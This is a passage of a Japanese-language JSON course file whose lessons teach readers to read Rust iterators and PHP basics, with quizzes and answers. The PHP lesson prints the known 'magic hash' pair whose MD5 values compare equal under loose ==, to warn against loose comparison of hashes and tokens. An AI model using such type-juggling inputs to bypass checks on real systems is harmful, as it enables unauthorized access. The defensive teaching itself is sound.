`>` cannot be applied to type `T` ``（T に `>` は使えない）というエラーになりました。\n\n長くなるときは、`where` で後ろに書きます。\n\n```rust\nfn summarize<T>(items: &[T]) -> String\nwhere\n    T: Display + Clone,\n{ ... }\n```\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `impl Display for MyError` | エラーの表示の仕方を決めている |\n| `fn handle(req: impl Into<String>)` | String に変換できるものなら何でも（`&str` も `String` も渡せる） |\n| `Box<dyn Fn(i32) -> i32>` | 「i32 を受け取って i32 を返す関数」を入れた箱（コールバック） |\n| `#[derive(Serialize, Deserialize)]` | serde で JSON などに変換できるようにする |\n| `impl<T: Display> Summary for Vec<T>` | 「Display できる T の Vec なら、Summary を持つ」 |\n| `async fn` / `#[tokio::main]` | 非同期の関数。tokio という実行のしくみの上で動く（Python の asyncio に当たる） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`impl Shape for Circle { ... }` の意味は？",
        "choices": [
         "Circle が Shape トレイトの約束（必要なメソッド）を守ることを宣言し、その中身を書いている",
         "Circle を Shape から継承している",
         "Shape という新しい型を作っている"
        ],
        "answer": 0,
        "explain": "Rust ではトレイトの実装を `impl トレイト for 型` と明示的に書きます。Go と違い、自動では当てはまりません。"
       },
       {
        "question": "`fn print_area(s: &impl Shape)` が受け取れるのは？",
        "choices": [
         "Shape という名前の型だけ",
         "Shape トレイトを実装した型なら何でも（を借りたもの）",
         "どんな型でも"
        ],
        "answer": 1,
        "explain": "impl Shape は「Shape の約束を守る型なら何でも」です。Rect も Circle も渡せます。"
       },
       {
        "question": "`fn largest<T: PartialOrd + Copy>(items: &[T]) -> T` の `T: PartialOrd` が必要な理由は？",
        "choices": [
         "T を表示するため",
         "関数の中で `x > max` と比べるので、T が比べられる型だと保証する必要があるから",
         "T を JSON にするため"
        ],
        "answer": 1,
        "explain": "Rust のジェネリクスは、T に何ができるかをトレイトで書かないと、その操作を使えません。"
       }
      ]
     ],
     "id": "05-traits-generics"
    },
    {
     "title": "Vec・HashMap とイテレータ ― AI の Rust を読む",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "collections",
      "higher_order",
      "reading"
     ],
     "summary": "Vec と HashMap、entry().or_insert() で数える定番の形、iter().filter().map().collect() のイテレータの鎖、クロージャ |x|。Python の内包表記と並べて読む。",
     "body": "## このレッスンのゴール\n\n- `Vec`・`HashMap` の基本の操作を読める\n- `.iter().filter(...).map(...).collect()` の鎖を、左から順に説明できる\n- クロージャ `|x| ...` と、`&&p` のような借用の記号に慣れる\n\n## Vec と HashMap\n\n| Rust | Python |\n|---|---|\n| `let mut v = Vec::new();` / `vec![1, 2, 3]` | `v = []` / `[1, 2, 3]` |\n| `v.push(4)` | `v.append(4)` |\n| `v.len()` / `v[0]` | `len(v)` / `v[0]` |\n| `v.get(10)` → `Option` | （範囲外は `IndexError`） |\n| `HashMap::new()` | `{}` |\n| `m.insert(k, v)` | `m[k] = v` |\n| `m.get(&k)` → `Option<&V>` | `m.get(k)` |\n\n```rust\nuse std::collections::HashMap;\n\nlet mut stock: HashMap<&str, u32> = HashMap::new();\nstock.insert(\"りんご\", 10);\n*stock.entry(\"りんご\").or_insert(0) += 5;\n*stock.entry(\"バナナ\").or_insert(0) += 3;\nprintln!(\"{:?} {:?}\", stock.get(\"りんご\"), stock.get(\"ぶどう\"));\n// Some(15) None\n```\n\n`m.get` は **Option** を返します（レッスン 3）。無いキーは `None` で、Go のように 0 になったり、Python のように例外になったりしません。\n\n### entry().or_insert()：数える定番\n\n```rust\n*stock.entry(\"バナナ\").or_insert(0) += 3;\n```\n\n| 部分 | 意味 |\n|---|---|\n| `.entry(\"バナナ\")` | 「バナナ」の場所を用意して |\n| `.or_insert(0)` | まだ無ければ 0 を入れる。その値への **書き換えのための借用**（`&mut u32`）を返す |\n| `*... += 3` | 借りた先の値（`*` で中身）に 3 を足す |\n\nPython の `stock[\"バナナ\"] = stock.get(\"バナナ\", 0) + 3`、`collections.defaultdict(int)` に当たります。単語を数えるときの形です。\n\n```rust\nlet mut counts: HashMap<&str, usize> = HashMap::new();\nfor w in \"a b a c b a\".split_whitespace() {\n    *counts.entry(w).or_insert(0) += 1;\n}\nlet mut v: Vec<_> = counts.into_iter().collect();\nv.sort_by(|a, b| b.1.cmp(&a.1));\nprintln!(\"{v:?}\");   // [(\"a\", 3), (\"b\", 2), (\"c\", 1)]\n```\n\nシェルコースの `sort | uniq -c | sort -rn`、SQL の `GROUP BY ... ORDER BY COUNT(*) DESC` と同じことを Rust で書いた形です。`b.1.cmp(&a.1)` は「タプルの 2 つ目（数）を、b と a の順で比べる」＝ 大きい順です。\n\n## イテレータの鎖\n\n```rust\nlet prices = vec![120, 90, 200, 1200, 250, 180];\n\nlet cheap: Vec<u32> = prices.iter().filter(|&&p| p < 200).cloned().collect();\nlet with_tax: Vec<u32> = prices.iter().map(|p| p * 110 / 100).collect();\nlet total: u32 = prices.iter().sum();\n\nprintln!(\"{cheap:?}\");      // [120, 90, 180]\nprintln!(\"{with_tax:?}\");   // [132, 99, 220, 1320, 275, 198]\nprintln!(\"{total}\");        // 2040\n```\n\nPython の内包表記と並べると、こうです。\n\n```python\ncheap = [p for p in prices if p < 200]\nwith_tax = [p * 110 // 100 for p in prices]\ntotal = sum(prices)\n```\n\n| 部分 | 意味 |\n|---|---|\n| `.iter()` | 1 つずつ取り出す **イテレータ** を作る（中身は借りる＝ `&u32`） |\n| `.filter(条件)` | 条件に合うものだけ通す |\n| `.map(変換)` | 1 つずつ変換する |\n| `.cloned()` | 借りたもの（`&u32`）を、値（`u32`）に複製する |\n| `.collect()` | 集めて Vec などにする。**何に集めるかは、左の型（`Vec<u32>`）で決まる** |\n| `.sum()` / `.count()` / `.max()` | 合計・数・最大 |\n\nJavaScript の `prices.filter(p => p < 200).map(...)`（JavaScript コースのレッスン 5）と、ほぼ同じ形です。違いは、Rust のイテレータは **`.collect()` や `.sum()` を呼ぶまで何もしない**（怠惰）ことで、途中で Vec を何個も作らないので速く動きます。\n\n### クロージャ |x|\n\n```rust\n|p| p * 110 / 100          // p を受け取って p * 110 / 100 を返す\n|a, b| b.1.cmp(&a.1)       // 2 つ受け取る\n|x| { let y = x + 1; y * 2 }   // 複数行なら { } で\n```\n\n`|引数| 本体` は **クロージャ**（その場で作る小さな関数）です。Python の `lambda p: p * 110 // 100`、JavaScript の `p => p * 110 / 100` に当たります。\n\n### &&p の読み方\n\n```rust\nprices.iter().filter(|&&p| p < 200)\n```\n\n`.iter()` は要素を **借りて**（`&u32`）渡し、`.filter` はさらにそれを **借りて**（`&&u32`）条件に渡します。`|&&p|` は「2 重に借りたものを、`&&` を外して p という値で受け取る」という書き方です。`|p| **p < 200` と書いても同じです。\n\n読むときは、**`&` は「借りたもの」の印なので、意味を考えるときは無視してよい** と思って大丈夫です。AI のコードで `&` の数が合わずにコンパイルできないときは、エラーの `help:` が直し方を教えてくれます。\n\n## よく出てくるイテレータの書き方\n\n```rust\nfor (i, n) in names.iter().enumerate() {\n    println!(\"{i}: {n}\");          // 0: りんご / 1: バナナ / 2: 牛乳\n}\n\nlet first_big = prices.iter().find(|&&p| p > 1000);\nprintln!(\"{first_big:?}\");         // Some(1200)\n\nlet s: String = names.iter().map(|n| n.to_string()).collect::<Vec<_>>().join(\"、\");\nprintln!(\"{s}\");                   // りんご、バナナ、牛乳\n```\n\n| Rust | Python |\n|---|---|\n| `.iter().enumerate()` | `enumerate(...)` |\n| `.find(条件)` → `Option` | `next((x for x in ... if 条件), None)` |\n| `.any(条件)` / `.all(条件)` | `any(...)` / `all(...)` |\n| `.zip(other)` | `zip(...)` |\n| `.collect::<Vec<_>>()` | `list(...)`（`::<>` は「何に集めるか」をその場で書く。ターボフィッシュと呼ばれる） |\n| `.join(\"、\")` | `\"、\".join(...)` |\n| `.into_iter()` | 借りずに、中身ごと取り出す（元の Vec は使えなくなる。レッスン 2 のムーブ） |\n\n## AI の Rust を読むときのまとめ\n\nこのコースで学んだ記号を、1 行の中で読む練習です。\n\n```rust\nlet users: Vec<User> = rows.iter().filter_map(|r| User::try_from(r).ok()).collect();\n```\n\n| 部分 | 読み方 |\n|---|---|\n| `rows.iter()` | rows を 1 つずつ借りて |\n| `User::try_from(r)` | User に変換してみる（`Result` が返る。レッスン 4） |\n| `.ok()` | Result を Option に（Err なら None） |\n| `.filter_map(...)` | Some のものだけ中身を取り出して通す（変換に失敗した行は捨てる） |\n| `.collect()` | `Vec<User>` に集める |\n\n「変換できた行だけを User の一覧にする」と読めれば十分です。⚠️ ただし、**変換に失敗した行を黙って捨てている** ので、それでよいのかは確認ポイントです（失敗を知りたいなら `collect::<Result<Vec<_>, _>>()?` で、1 つでも失敗したらエラーにできる）。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`prices.iter().map(|p| p * 2).collect::<Vec<_>>()` を Python で書くと？",
        "choices": [
         "`[p * 2 for p in prices]`",
         "`sum(p * 2 for p in prices)`",
         "`prices * 2`"
        ],
        "answer": 0,
        "explain": "map で 1 つずつ 2 倍にして、collect で Vec に集めています。"
       },
       {
        "question": "`*counts.entry(w).or_insert(0) += 1;` は何をしている？",
        "choices": [
         "counts を 0 で初期化している",
         "w がまだ無ければ 0 を入れ、その値に 1 を足す（数を数える）",
         "w を counts から削除している"
        ],
        "answer": 1,
        "explain": "entry().or_insert(0) で「無ければ 0」の場所を用意し、その値に 1 を足します。Python の `counts[w] = counts.get(w, 0) + 1` です。"
       },
       {
        "question": "`rows.iter().filter_map(|r| parse(r).ok()).collect()` の確認ポイントは？",
        "choices": [
         "filter_map は遅いので使ってはいけない",
         "変換に失敗した行を、エラーにせず黙って捨てているので、それで問題ないか",
         "ok() は panic するので危ない"
        ],
        "answer": 1,
        "explain": "`.ok()` は Err を None にし、filter_map が None を捨てます。失敗を知る必要があるなら、Result のまま集めてエラーにします。"
       }
      ]
     ],
     "id": "06-iterators-collections"
    }
   ],
   "status": "open"
  },
  {
   "title": "PHP",
   "icon": "🐘",
   "order": 90,
   "category": "language",
   "description": "WordPress や Laravel で使われる Web サーバーの言語。<?php と echo、$ の変数とゆるい比較（== と ===）、配列と関数、クラス、フォームとデータベース（PDO・htmlspecialchars）、最後に WordPress と Laravel のコードを読む。PHP 8.3 で実行して確かめたもの。",
   "levels": {
    "1": "入門：変数と配列",
    "2": "基礎：関数とクラス",
    "3": "実践：Web とフレームワーク"
   },
   "id": "90-php",
   "lessons": [
    {
     "title": "<?php と echo・$ の変数 ― == の落とし穴まで",
     "level": 1,
     "minutes": 16,
     "concepts": [
      "variables",
      "types",
      "operators",
      "strings"
     ],
     "summary": "PHP のファイルの形（<?php）、echo、$ で始まる変数、. で文字列をつなぐ、\" と ' の違い。== がゆるい比較なので === を使う理由を、実際の結果で。未定義の変数と ??。",
     "body": "## このレッスンのゴール\n\n- `<?php`・`echo`・`$変数` を読める\n- 文字列のつなぎ方（`.`）と、`\"...\"` と `'...'` の違いが分かる\n- `==` と `===` の違いを説明し、AI のコードで `==` を見たら確認できる\n\n## PHP とは\n\n**PHP** は、Web サーバーの上で動いて HTML を作る言語です。世界中の Web サイトのかなりの割合で使われていて、特に **WordPress**（ブログ・会社のサイト）や **Laravel**（Web アプリのフレームワーク）で出会います。「既存のサイトを少し直してほしい」と頼まれたときに、読めると役立つ言語です。\n\n## ファイルの形と echo\n\n```php\n<?php\n$name = \"Ryo\";\n$price = 120;\n$count = 3;\necho \"こんにちは、$name さん\\n\";\necho 'こんにちは、$name さん' . \"\\n\";\necho \"合計 \" . ($price * $count) . \" 円\\n\";\necho \"合計 {$price} 円 × {$count}\\n\";\n```\n\n```text\nこんにちは、Ryo さん\nこんにちは、$name さん\n合計 360 円\n合計 120 円 × 3\n```\n\n（このコースの出力は、すべて PHP 8.3 で実際に実行したものです）\n\n| PHP | 意味 | Python で言うと |\n|---|---|---|\n| `<?php` | ここから PHP のコード（ファイルの先頭に書く） | — |\n| `$name = \"Ryo\";` | 変数。**名前の前に必ず `$`**、文の終わりに `;` | `name = \"Ryo\"` |\n| `echo ...;` | 出力する（Web なら HTML に書き出される） | `print(...)` |\n| `\"...$name...\"` | ダブルクォートの中では **変数が置き換わる** | `f\"...{name}...\"` |\n| `'...$name...'` | シングルクォートでは **そのまま** | `\"...$name...\"` |\n| `\"...\" . \"...\"` | **`.` で文字列をつなぐ**（`+` ではない） | `\"...\" + \"...\"` |\n| `{$price}` | 変数の範囲をはっきりさせる | `{price}` |\n\n`\"` と `'` の違いは、シェルコースのレッスン 2 とまったく同じです。PHP はシェルや Perl の影響を受けているので、`$` の変数もそこから来ています。\n\n⚠️ JavaScript や Python の癖で `\"合計 \" + $total` と書くと、PHP は **数の足し算** をしようとします（`\"合計 \"` は数にならないので、PHP 8 ではエラー）。つなぐのは `.` です。\n\n### HTML の中に埋め込む\n\nPHP は、もともと **HTML の中に少しだけプログラムを埋め込む** ために作られました。\n\n```php\n<p>こんにちは、<?= htmlspecialchars($name) ?> さん</p>\n```\n\n`<?= ... ?>` は `<?php echo ... ?>` の短い書き方です。`htmlspecialchars` は XSS を防ぐためのエスケープ（レッスン 4・セキュリティのコースのレッスン 4）です。\n\n## 型を見る：var_dump\n\n```php\nvar_dump($price, \"120\", 1.5, true, null);\n```\n\n```text\nint(120)\nstring(3) \"120\"\nfloat(1.5)\nbool(true)\nNULL\n```\n\n`var_dump` は、**型と値を両方** 表示します（Python の `repr()` と `type()` を合わせたもの）。`string(3)` の 3 は **バイト数** です。\n\n```php\nvar_dump(strlen(\"りんご\"), mb_strlen(\"りんご\"));\n// int(9)  int(3)\n```\n\n`strlen` はバイト数、`mb_strlen` は文字数です（コンピュータの基礎コースの「文字コード」）。日本語を扱うときは `mb_` で始まる関数を使います。\n\n## ⚠️ == はゆるい、=== は厳しい\n\nPHP の比較でいちばん大事なところです。\n\n```php\nvar_dump(\"120\" == 120);     // bool(true)   ← 文字列と数なのに等しい\nvar_dump(\"120\" === 120);    // bool(false)\nvar_dump(\"1e3\" == \"1000\");  // bool(true)   ← \"1e3\" を 1000 という数だと解釈した\nvar_dump(null == false);    // bool(true)\nvar_dump(\"0\" == false);     // bool(true)\nvar_dump(\"abc\" == 0);       // bool(false)  （PHP 7 までは true だった）\nvar_dump(0 == \"\");          // bool(false)  （PHP 7 までは true だった）\n```\n\n| 演算子 | 意味 |\n|---|---|\n| `==` | **型をそろえてから** 比べる（ゆるい比較）。文字列が数っぽければ数として比べる |\n| `===` | **型も値も同じ** なら真（厳しい比較） |\n| `!=` / `!==` | その否定 |\n\n`\"1e3\" == \"1000\"` が真になるのは、どちらも「数として読める文字列」なので、数（1000）に変換してから比べたからです。パスワードのハッシュやトークンを `==` で比べると、まったく違う値が等しくなってしまう、という有名な脆弱性もありました。\n\n```php\nvar_dump(md5(\"240610708\") == md5(\"QNKCDZO\"));    // bool(true)   ← 違う文字列なのに\nvar_dump(md5(\"240610708\") === md5(\"QNKCDZO\"));   // bool(false)\n```\n\n2 つの MD5 の値は、どちらも `0e` の後に数字だけが続く文字列になり、PHP が「0 × 10 の何乗 ＝ 0」という数だと解釈して、0 == 0 で真にしてしまいます（実際に実行した結果です）。\n\n**PHP では、基本的に `===` を使う** のが安全です。JavaScript の `==` と `===`（JavaScript コースのレッスン 1）と同じ考え方です。\n\n### 数っぽい文字列\n\n```php\n$x = \"5 apples\";\nvar_dump((int)$x);           // int(5)\nvar_dump(intdiv(7, 2), 7 / 2, 7 % 2);   // int(3) float(3.5) int(1)\n```\n\n`(int)` で数に変換すると、先頭の数の部分だけが使われます。`7 / 2` は Python 3 と同じく **3.5**（小数）で、整数の割り算は `intdiv` です。\n\n## 未定義の変数と ??\n\n```php\necho $nope;\necho \"\\n続きます\\n\";\n```\n\n```text\nPHP Warning:  Undefined variable $nope in .../p1.php on line 16\n\n続きます\n```\n\n存在しない変数を使うと、**警告を出して、空として先に進みます**（シェルの空の変数と同じ。Python なら `NameError` で止まる）。\n\n```php\nvar_dump($undefined ?? \"default\");   // string(7) \"default\"\n```\n\n`??` は「**左が無い（null）なら右**」です。Python の `x if x is not None else \"default\"`、JavaScript の `??` と同じです。フォームの値（`$_POST['name'] ?? ''`）でよく使います（レッスン 4）。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `if ($a == $b)` | ⚠️ ゆるい比較。型の違うものが等しくなりうる。`===` に |\n| `\"...\" + $x` で文字列をつなごうとしている | ⚠️ PHP は `.` でつなぐ |\n| `strlen($name) > 20` で文字数の制限 | ⚠️ バイト数。日本語は `mb_strlen` |\n| `$_GET['id'] ?? null` | ✅ 無ければ null |\n| `@$undefined` | `@` は警告を **消す**。問題を隠しているので要注意 |\n| `declare(strict_types=1);` | 関数の引数の型を厳しくチェックする設定（レッスン 2） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "PHP で `\"120\" == 120` の結果は？",
        "choices": [
         "true（文字列を数に変換してから比べる）",
         "false（型が違う）",
         "エラー"
        ],
        "answer": 0,
        "explain": "`==` は型をそろえてから比べるゆるい比較です。型も同じか確かめたいときは `===` を使います（こちらは false）。"
       },
       {
        "question": "PHP で文字列をつなぐ演算子は？",
        "choices": [
         "`+`",
         "`.`",
         "`&`"
        ],
        "answer": 1,
        "explain": "PHP では `\"合計 \" . $total . \" 円\"` のように `.` でつなぎます。`+` は数の足し算です。"
       },
       {
        "question": "`echo '合計 $total 円';` の出力は？",
        "choices": [
         "合計 360 円",
         "合計 $total 円",
         "エラー"
        ],
        "answer": 1,
        "explain": "シングルクォートの中では変数が置き換わりません。置き換えたいならダブルクォートです。"
       }
      ]
     ],
     "id": "01-php-echo-variables"
    },
    {
     "title": "配列と関数 ― リストも辞書も「配列」",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "collections",
      "functions",
      "type_hints"
     ],
     "summary": "PHP の配列は、リストと辞書を兼ねる。[] で追加、=> でキー、foreach、isset と ??、array_filter と array_map、json_encode。関数の型と strict_types、関数の中から外の変数が見えないスコープ。",
     "body": "## このレッスンのゴール\n\n- PHP の配列（番号の配列・キーの配列）と `foreach` を読める\n- `array_filter`・`array_map`・`json_encode` を読める\n- 関数の型の書き方と、`declare(strict_types=1)`、スコープの違いが分かる\n\n## 配列：リストと辞書が同じもの\n\n```php\n$fruits = [\"りんご\", \"バナナ\"];\n$fruits[] = \"みかん\";                         // 末尾に追加\necho count($fruits), \" \", $fruits[0], \"\\n\";   // 3 りんご\n\n$prices = [\"りんご\" => 120, \"バナナ\" => 90];\n$prices[\"みかん\"] = 80;\n```\n\nPHP には、Python のリストと辞書の区別がありません。どちらも **配列**（array）です。\n\n| PHP | Python |\n|---|---|\n| `[\"りんご\", \"バナナ\"]` | `[\"りんご\", \"バナナ\"]`（リスト） |\n| `[\"りんご\" => 120]` | `{\"りんご\": 120}`（辞書） |\n| `$a[] = \"x\"` | `a.append(\"x\")` |\n| `count($a)` | `len(a)` |\n| `$a[\"りんご\"]` | `a[\"りんご\"]` |\n| `unset($a[\"りんご\"])` | `del a[\"りんご\"]` |\n\n番号の配列も、実は **0・1・2 というキーを自動で振った** キーの配列です。古いコードでは `array(\"りんご\", \"バナナ\")` という書き方も見かけます（同じ意味）。\n\n## foreach\n\n```php\nforeach ($prices as $name => $price) {\n    echo \"$name: $price 円\\n\";\n}\n```\n\n```text\nりんご: 120 円\nバナナ: 90 円\nみかん: 80 円\n```\n\n| PHP | Python |\n|---|---|\n| `foreach ($a as $v)` | `for v in a:` |\n| `foreach ($a as $k => $v)` | `for k, v in a.items():` |\n\n順番は **入れた順** が保たれます（Python 3.7 以降の辞書と同じ）。\n\n## あるかどうか\n\n```php\nvar_dump(isset($prices[\"ぶどう\"]));            // bool(false)\nvar_dump($prices[\"ぶどう\"] ?? 0);              // int(0)\nvar_dump(array_key_exists(\"りんご\", $prices)); // bool(true)\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `isset($a[\"k\"])` | キーがあり、値が null ではない |\n| `$a[\"k\"] ?? 0` | 無ければ 0（レッスン 1） |\n| `array_key_exists(\"k\", $a)` | キーがある（値が null でも true） |\n| `in_array(\"x\", $a)` | 値として入っている（Python の `\"x\" in a`）。⚠️ ゆるい比較なので、`in_array(\"x\", $a, true)` と第 3 引数を true に |\n\n無いキーを `$prices[\"ぶどう\"]` と直接読むと、`Undefined array key` という警告が出て null になります。\n\n## 配列の関数\n\n```php\n$cheap = array_filter($prices, fn($p) => $p < 100);\n$withTax = array_map(fn($p) => intdiv($p * 110, 100), $prices);\nprint_r($cheap);\nprint_r($withTax);\n```\n\n```text\nArray\n(\n    [バナナ] => 90\n    [みかん] => 80\n)\nArray\n(\n    [りんご] => 132\n    [バナナ] => 99\n    [みかん] => 88\n)\n```\n\n| PHP | Python |\n|---|---|\n| `fn($p) => $p < 100` | `lambda p: p < 100`（アロー関数） |\n| `array_filter($a, 条件)` | `{k: v for k, v in a.items() if 条件}` |\n| `array_map(変換, $a)` | `{k: 変換(v) for k, v in a.items()}` |\n| `array_keys($a)` / `array_values($a)` | `list(a.keys())` / `list(a.values())` |\n| `usort($a, fn($x, $y) => $x <=> $y)` | `a.sort()`（`<=>` は大小を -1・0・1 で返す） |\n| `implode(\"、\", $a)` / `explode(\",\", $s)` | `\"、\".join(a)` / `s.split(\",\")` |\n| `print_r($a)` | `print(a)`（人が読む形で表示） |\n\n⚠️ `array_filter` と `array_map` は **引数の順番が逆**（filter は配列が先、map は関数が先）です。PHP の有名な不揃いなので、AI のコードを読むときは引数をよく見ましょう。\n\n## JSON\n\n```php\necho json_encode([\"name\" => \"Ryo\", \"tags\" => [\"a\", \"b\"]], JSON_UNESCAPED_UNICODE);\n// {\"name\":\"Ryo\",\"tags\":[\"a\",\"b\"]}\n\nvar_dump(json_decode('{\"id\": 1, \"title\": \"牛乳\"}', true));\n// array(2) { [\"id\"]=> int(1)  [\"title\"]=> string(6) \"牛乳\" }\n```\n\nキーの配列は JSON のオブジェクトに、番号の配列は JSON の配列になります。`JSON_UNESCAPED_UNICODE` を付けないと、日本語が `牛乳` のように変換されます。`json_decode(..., true)` の `true` は「配列で返して」（付けないとオブジェクトになる）。\n\n## 関数\n\n```php\nfunction withTax(int $price, float $rate = 0.1): int {\n    return (int) round($price * (1 + $rate));\n}\n\necho withTax(120), \" \", withTax(120, 0.08), \" \", withTax(rate: 0.08, price: 200);\n// 132 130 216\n```\n\n| PHP | Python |\n|---|---|\n| `function withTax(int $price, float $rate = 0.1): int` | `def with_tax(price: int, rate: float = 0.1) -> int:` |\n| `withTax(rate: 0.08, price: 200)` | `with_tax(rate=0.08, price=200)`（名前付き引数。PHP 8 から） |\n\n### 型のチェックと strict_types\n\n```php\nfunction withTax(int $price): int { return intdiv($price * 110, 100); }\necho withTax(\"120\");     // 132   ← 文字列 \"120\" が int に変換されて動いた\necho withTax(\"abc\");     // TypeError: withTax(): Argument #1 ($price) must be of type int, string given\n```\n\n初期設定では、`\"120\"` のような **数っぽい文字列は自動で int に変換** されます。ファイルの先頭に `declare(strict_types=1);` を書くと、**変換せずに TypeError** にします。\n\n```php\n<?php\ndeclare(strict_types=1);\n...\nwithTax(\"120\");   // TypeError: ... must be of type int, string given\n```\n\nLaravel などの今の PHP のコードには、たいてい書かれています。Python の型ヒントと違い、PHP の型は **実行したときに本当にチェックされます**。\n\n### ⚠️ 関数の中から外の変数は見えない\n\n```php\n$total = 0;\nfunction addBad($n) { $total += $n; return $total; }\necho addBad(5), \" / total=\", $total;\n```\n\n```text\nPHP Warning:  Undefined variable $total in .../p2c.php on line 6\n5 / total=0\n```\n\nPHP の関数の中からは、**外の変数が見えません**（Python なら読むことはできる）。関数の中の `$total` は別の（未定義の）変数として扱われ、外の `$total` は 0 のままでした。外の値は **引数で渡す** のが基本です（`global $total;` と書けば使えますが、古いコードの書き方です）。\n\nアロー関数 `fn($p) => ...` だけは、外の変数を自動で使えます。`function () use ($rate) { ... }` の `use` は、無名関数に外の変数を持ち込む書き方です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `$data = json_decode($body, true);` | JSON を配列に。`$data['title'] ?? ''` で取り出す |\n| `array_filter($a)`（条件なし） | 「空っぽ・0・\"0\"・null」を全部取り除く。⚠️ 0 も消える |\n| `in_array($x, $list)` | ⚠️ ゆるい比較。第 3 引数 `true` があるか |\n| `foreach ($items as &$item)` | `&` で **元の配列を書き換える**。ループの後に `unset($item)` が無いと、次のループで不思議なバグが起きる |\n| `compact('a', 'b')` / `extract($arr)` | 変数と配列の変換。`extract` は外からの配列に使うと、変数を上書きされて危険 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "PHP の `$prices = [\"りんご\" => 120];` は、Python で言うと何？",
        "choices": [
         "リスト `[120]`",
         "辞書 `{\"りんご\": 120}`",
         "タプル"
        ],
        "answer": 1,
        "explain": "PHP の配列は、`=>` でキーを付けると辞書のように使えます。リストも辞書も、PHP では同じ「配列」です。"
       },
       {
        "question": "`$total = 0; function add($n) { $total += $n; }` を呼んでも、外の `$total` が変わらない理由は？",
        "choices": [
         "PHP の関数の中からは外の変数が見えず、中の `$total` は別の変数だから",
         "`+=` が使えないから",
         "関数が呼ばれていないから"
        ],
        "answer": 0,
        "explain": "PHP の関数は外の変数を自動では使いません。引数で受け取り、戻り値で返すのが基本です。"
       },
       {
        "question": "`declare(strict_types=1);` があるファイルで、`int` の引数に `\"120\"` を渡すと？",
        "choices": [
         "120 に変換されて動く",
         "TypeError になる",
         "0 になる"
        ],
        "answer": 1,
        "explain": "strict_types=1 では、数っぽい文字列も自動で変換されません。無い場合は \"120\" が 120 に変換されて動きます。"
       }
      ]
     ],
     "id": "02-arrays-functions"
    },
    {
     "title": "クラス ― -> と :: と $this",
     "level": 2,
     "minutes": 16,
     "concepts": [
      "classes",
      "types"
     ],
     "summary": "PHP のクラスの読み方。new と ->、$this、コンストラクタでのプロパティの宣言（PHP 8）、public・private・readonly、static と ::、継承と parent::、インターフェース。",
     "body": "## このレッスンのゴール\n\n- `new`・`->`・`$this`・`::` を読める\n- `public function __construct(public readonly string $name, ...)` の短い書き方が分かる\n- `private`・`readonly`・`static`・`extends`・`implements` の意味が分かる\n\n## クラスの例\n\n```php\n<?php\ndeclare(strict_types=1);\n\ninterface HasPrice {\n    public function price(): int;\n}\n\nclass Product implements HasPrice {\n    public function __construct(\n        public readonly string $name,\n        private int $basePrice,\n    ) {}\n\n    public function price(): int {\n        return intdiv($this->basePrice * 110, 100);\n    }\n\n    public function discount(int $yen): void {\n        $this->basePrice -= $yen;\n    }\n\n    public static function free(string $name): self {\n        return new self($name, 0);\n    }\n}\n\n$apple = new Product(\"りんご\", 120);\necho $apple->name, \" \", $apple->price(), \"\\n\";   // りんご 132\n$apple->discount(20);\necho $apple->price(), \"\\n\";                      // 110\necho Product::free(\"試供品\")->price(), \"\\n\";      // 0\n```\n\nPython で書くと、こうです。\n\n```python\nclass Product:\n    def __init__(self, name: str, base_price: int):\n        self.name = name\n        self._base_price = base_price\n\n    def price(self) -> int:\n        return self._base_price * 110 // 100\n\n    def discount(self, yen: int) -> None:\n        self._base_price -= yen\n\n    @staticmethod\n    def free(name: str) -> \"Product\":\n        return Product(name, 0)\n\napple = Product(\"りんご\", 120)\n```\n\n| PHP | 意味 | Python で言うと |\n|---|---|---|\n| `new Product(...)` | 作る | `Product(...)` |\n| `$apple->name` / `$apple->price()` | **`->`** でプロパティ・メソッド | `apple.name` / `apple.price()` |\n| `$this` | 自分自身 | `self` |\n| `__construct(...)` | コンストラクタ | `__init__` |\n| `Product::free(...)` | **`::`** で static（インスタンスを作らずに呼ぶ）メソッド | `Product.free(...)` |\n| `self` | 自分のクラス | クラス名 |\n| `: void` | 何も返さない | `-> None` |\n\nPHP では `.` が文字列をつなぐ演算子（レッスン 1）なので、メソッドを呼ぶのは **`->`** です。\n\n## コンストラクタでのプロパティの宣言\n\n```php\npublic function __construct(\n    public readonly string $name,\n    private int $basePrice,\n) {}\n```\n\nPHP 8 からの短い書き方で、**引数に `public` や `private` を付けると、同じ名前のプロパティを作って、そこに入れてくれます**。昔の書き方だと、こうなります。\n\n```php\nprivate string $name;\nprivate int $basePrice;\npublic function __construct(string $name, int $basePrice) {\n    $this->name = $name;\n    $this->basePrice = $basePrice;\n}\n```\n\n## public・private・readonly\n\n```php\n$apple->name = \"みかん\";\n// Error: Cannot modify readonly property Product::$name\n\necho $apple->basePrice;\n// Error: Cannot access private property Product::$basePrice\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `public` | どこからでも使える |\n| `private` | **このクラスの中だけ**（外から読むとエラー） |\n| `protected` | このクラスと、継承したクラスの中だけ |\n| `readonly` | 最初に入れた後は **変えられない** |\n\nPython の `_name` は「さわらないでね」というお願いでしたが、PHP の `private` は **本当にエラーになります**。\n\n## 継承とインターフェース\n\n```php\nclass Set extends Product {\n    public function price(): int {\n        return parent::price() - 50;\n    }\n}\n\n$set = new Set(\"詰め合わせ\", 1000);\necho $set->price();                                 // 1050\necho $set instanceof HasPrice ? \"HasPrice\" : \"\";    // HasPrice\n```\n\n| 書き方 | 意味 | Python で言うと |\n|---|---|---|\n| `class Set extends Product` | Product を **継承** | `class Set(Product):` |\n| `parent::price()` | 親のメソッドを呼ぶ | `super().price()` |\n| `interface HasPrice { ... }` | 「このメソッドを持つ」という約束 | `typing.Protocol` / 抽象クラス |\n| `class Product implements HasPrice` | 約束を守ると宣言（Rust の `impl ... for`、Go と違い明示的） | |\n| `$x instanceof HasPrice` | その型か | `isinstance(x, HasPrice)` |\n\n## 並べ替え\n\n```php\n$items = 